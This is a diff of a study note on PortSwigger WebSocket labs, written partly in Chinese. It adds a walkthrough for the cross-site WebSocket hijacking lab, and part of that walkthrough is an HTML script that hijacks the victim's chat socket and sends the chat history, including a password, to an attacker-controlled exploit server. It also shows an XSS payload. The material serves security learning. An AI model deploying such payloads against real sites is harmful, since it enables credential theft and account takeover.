@@ -1,8 +1,10 @@
 ---
 title: WebSockets
 description: WebSockets
+# last_update:
+#   date: "2025-09-19T08:00:00+08:00"
 last_update:
-  date: "2025-09-19T08:00:00+08:00"
+  date: "2025-11-09T08:00:00+08:00"
 ---
 
 ## Lab: Manipulating WebSocket messages to exploit vulnerabilities
@@ -210,12 +212,39 @@ ws.send(JSON.stringify({ message: `<img src=x OnerRor=window['alert'](1)>` }));
 
 ## Lab: Cross-site WebSocket hijacking
 
+<!-- last_update:
+  date: "2025-11-09T08:00:00+08:00" -->
+
 | Dimension | Description                                                                                                                       |
 | --------- | --------------------------------------------------------------------------------------------------------------------------------- |
 | Document  | https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking#performing-a-cross-site-websocket-hijacking-attack |
 | Lab       | https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab                                                |
 
-<!-- todo-yus 免費版QQ -->
+- 這題不需要用 Burp Collaborator's default public server，只要用 Lab 內建的 exploit-server 即可
+- 這題的 Cookie: session 是 SameSite: none
+
+exploit-server 構造
+
+```html
+<script>
+  const ws = new WebSocket(
+    "https://0a28006d0331937d8290013d00e80059.web-security-academy.net/chat",
+  );
+  ws.addEventListener("open", () => {
+    ws.send("READY");
+  });
+  ws.addEventListener("message", (e) => {
+    fetch(
+      `https://exploit-0ab5006f033193d3824b00af01be0093.exploit-server.net/?message=${encodeURIComponent(e.data)}`,
+      { mode: "no-cors" },
+    );
+  });
+</script>
+```
+
+其中 "READY" 指令是這題要觀察的點，可以列出所有 chat history，其中就包含 victim 的密碼
+
+之後就是到 `YOUR_EXPLOIT_SERVER.exploit-server.net/log` 查看 log 即可通關～
 
 ## 小結
 
